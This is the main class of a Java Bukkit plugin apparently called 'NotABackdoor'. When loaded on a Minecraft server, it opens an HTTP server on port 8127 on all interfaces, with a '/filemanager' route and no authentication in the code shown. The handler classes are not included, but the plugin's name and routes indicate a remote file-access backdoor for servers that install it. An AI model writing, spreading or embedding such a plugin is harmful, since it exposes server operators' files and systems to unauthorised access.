package com.lian.notabackdoor;

import java.io.IOException;
import java.net.InetSocketAddress;

import com.lian.notabackdoor.pages.FileManagerPageHandler;
import com.lian.notabackdoor.pages.LostPageHandler;
import com.lian.notabackdoor.pages.MainPageHandler;
import com.lian.notabackdoor.pages.RootPageHandler;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import org.bukkit.plugin.java.JavaPlugin;

public class NotABackdoor extends JavaPlugin {
    private HttpServer server;

    public String pluginName = getName();

    public void onEnable() {
        int port = 8127; // The port to listen on
        int backlog = 100; // The maximum number of queued incoming connections
        InetSocketAddress address = new InetSocketAddress(port);

        try {
            server = HttpServer.create(address, backlog);
        } catch (IOException e) {
            getLogger().severe("Failed to create HTTP server: " + e.getMessage());
            return;
        }

        server.createContext("/", new RootPageHandler());
        server.createContext("/main", new MainPageHandler());
        server.createContext("/filemanager", new FileManagerPageHandler());
        server.createContext("/lost", new LostPageHandler());
        server.setExecutor(null); // Use the default executor
        server.start();

        getLogger().info("Web server started on port " + port);
    }

    public void onDisable() {
        if (server != null) {
            server.stop(0); // Stop the server with no delay
        }
    }

    public static void redirectToLostPage(HttpExchange exchange) throws IOException {
        exchange.getResponseHeaders().add("Location", "/lost");
        exchange.sendResponseHeaders(302, -1);
        exchange.close();
    }
}

